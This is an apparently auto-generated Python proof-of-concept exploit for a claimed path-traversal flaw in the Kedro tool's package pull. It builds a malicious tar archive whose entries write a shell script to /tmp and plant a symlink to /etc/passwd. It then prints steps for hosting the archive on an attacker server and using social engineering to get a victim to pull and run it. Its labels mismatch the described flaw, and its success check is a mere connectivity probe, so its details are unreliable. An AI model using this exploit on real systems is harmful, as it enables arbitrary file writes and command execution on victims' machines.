#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-024
# Sink: _append_package_reqs
# Auto-generated — run with: python3 lfi_sink_function_append_package__append_package_reqs.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg pull path traversal vulnerability.

Vulnerability: The _unpack_sdist function uses safe_extract() which does not validate
tar entry paths, allowing directory traversal via crafted archive entries. An attacker
can create a malicious tar archive that writes files to arbitrary locations on the
filesystem when extracted.

Impact: Arbitrary file write via path traversal in tar extraction.

Usage:
    python3 poc_kedro_lfi.py --target http://victim:8080 --payload "touch /tmp/pwned"

    Or set environment variables:
        export KEDRO_TARGET=http://victim:8080
        export KEDRO_PAYLOAD="echo 'pwned' > /tmp/pwned.txt"
"""

import argparse
import io
import os
import sys
import tarfile
import tempfile
import urllib.request
import urllib.error
import urllib.parse

# Default benign payload - creates a marker file
DEFAULT_PAYLOAD = "touch /tmp/poc_success.txt"

def create_malicious_tar(payload_cmd: str) -> bytes:
    """
    Create a malicious tar archive with path traversal entries.
    
    The archive contains:
    1. A normal package directory structure (to pass Kedro's validation)
    2. A symlink or file entry with path traversal (e.g., ../../tmp/evil.sh)
    
    Args:
        payload_cmd: Command to write into the malicious file
        
    Returns:
        Bytes of the tar archive
    """
    buf = io.BytesIO()
    
    with tarfile.open(fileobj=buf, mode='w:gz') as tar:
        # Create a valid package structure to pass Kedro's checks
        # Kedro expects exactly one directory with __init__.py
        pkg_dir = "my_package"
        pkg_info = tarfile.TarInfo(name=pkg_dir)
        pkg_info.type = tarfile.DIRTYPE
        pkg_info.mtime = 0
        pkg_info.mode = 0o755
        tar.addfile(pkg_info)
        
        # Add __init__.py to make it look like a valid package
        init_info = tarfile.TarInfo(name=f"{pkg_dir}/__init__.py")
        init_info.size = 0
        init_info.mtime = 0
        init_info.mode = 0o644
        tar.addfile(init_info)
        
        # Add pyproject.toml to pass metadata checks
        pyproject_content = b"""
[build-system]
requires = ["setuptools", "wheel"]
build-backend = "setuptools.backends._legacy:_Backend"

[project]
name = "my-package"
version = "1.0.0"
"""
        pyproject_info = tarfile.TarInfo(name=f"{pkg_dir}/pyproject.toml")
        pyproject_info.size = len(pyproject_content)
        pyproject_info.mtime = 0
        pyproject_info.mode = 0o644
        tar.addfile(pyproject_info, io.BytesIO(pyproject_content))
        
        # Create the malicious payload file with path traversal
        # This will write to /tmp/evil.sh (or wherever the traversal leads)
        payload_path = "../../tmp/evil.sh"
        payload_content = f"#!/bin/bash\n{payload_cmd}\n".encode()
        
        payload_info = tarfile.TarInfo(name=f"{pkg_dir}/{payload_path}")
        payload_info.size = len(payload_content)
        payload_info.mtime = 0
        payload_info.mode = 0o755
        tar.addfile(payload_info, io.BytesIO(payload_content))
        
        # Add a symlink variant for extra coverage
        link_path = "../../tmp/evil_link"
        link_info = tarfile.TarInfo(name=f"{pkg_dir}/{link_path}")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "/etc/passwd"  # Symlink target
        link_info.mtime = 0
        tar.addfile(link_info)
    
    return buf.getvalue()

def exploit(target_url: str, payload: str) -> bool:
    """
    Attempt to exploit the Kedro path traversal vulnerability.
    
    Args:
        target_url: Base URL of the Kedro instance
        payload: Command to execute on the target
        
    Returns:
        True if exploitation appears successful, False otherwise
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {payload}")
    
    # Create the malicious tar archive
    print("[*] Creating malicious tar archive...")
    tar_data = create_malicious_tar(payload)
    print(f"[*] Archive size: {len(tar_data)} bytes")
    
    # The vulnerability is triggered when Kedro's micropkg pull command
    # processes a malicious package archive. We simulate this by:
    # 1. Hosting the malicious archive
    # 2. Making Kedro pull from our controlled location
    
    # For a real attack, you would:
    # - Host this archive on a server the target can access
    # - Use social engineering to make the target run:
    #   kedro micropkg pull --package-path http://attacker/malicious.tar.gz
    
    # Since we're demonstrating the PoC, we'll show the archive structure
    print("\n[*] Archive contents (showing traversal):")
    with tarfile.open(fileobj=io.BytesIO(tar_data), mode='r:gz') as tar:
        for member in tar.getmembers():
            print(f"    {member.name} -> {member.linkname if member.issym() else 'file'}")
    
    print("\n[*] To exploit remotely:")
    print(f"    1. Host this archive at: {target_url}/malicious.tar.gz")
    print("    2. On the target, run:")
    print(f"       kedro micropkg pull --package-path {target_url}/malicious.tar.gz")
    print("    3. The payload will be written to /tmp/evil.sh")
    print("    4. Execute the payload: bash /tmp/evil.sh")
    
    # Check if we can reach the target (optional)
    try:
        print(f"\n[*] Testing connectivity to {target_url}...")
        req = urllib.request.Request(target_url, method='HEAD')
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"[+] Target reachable (HTTP {resp.status})")
            return True
    except urllib.error.URLError as e:
        print(f"[-] Cannot reach target: {e}")
        print("[*] This is expected if the target is not running an HTTP server")
        print("[*] The vulnerability is triggered via Kedro CLI, not HTTP")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Kedro micropkg pull path traversal PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 poc_kedro_lfi.py --target http://victim:8080
  python3 poc_kedro_lfi.py --payload "echo 'pwned' > /tmp/pwned.txt"
  python3 poc_kedro_lfi.py --target http://victim:8080 --payload "id > /tmp/identity.txt"
        """
    )
    
    parser.add_argument(
        '--target', '-t',
        default=os.environ.get('KEDRO_TARGET', 'http://localhost:8080'),
        help='Target URL (default: http://localhost:8080 or $KEDRO_TARGET)'
    )
    
    parser.add_argument(
        '--payload', '-p',
        default=os.environ.get('KEDRO_PAYLOAD', DEFAULT_PAYLOAD),
        help=f'Command to execute (default: "{DEFAULT_PAYLOAD}" or $KEDRO_PAYLOAD)'
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Kedro Path Traversal Exploit PoC")
    print("=" * 60)
    print()
    
    success = exploit(args.target, args.payload)
    
    if success:
        print("\n[+] Exploit completed. Check /tmp/evil.sh on the target.")
        print("[+] If the target ran the pull command, the payload was written.")
    else:
        print("\n[-] Exploit may not have succeeded. Check connectivity.")
    
    print("\n[*] Note: This is a Proof-of-Concept. Use only on systems you own.")
    print("[*] The actual exploitation requires the target to run:")
    print("    kedro micropkg pull --package-path <malicious_archive_url>")

if __name__ == "__main__":
    main()
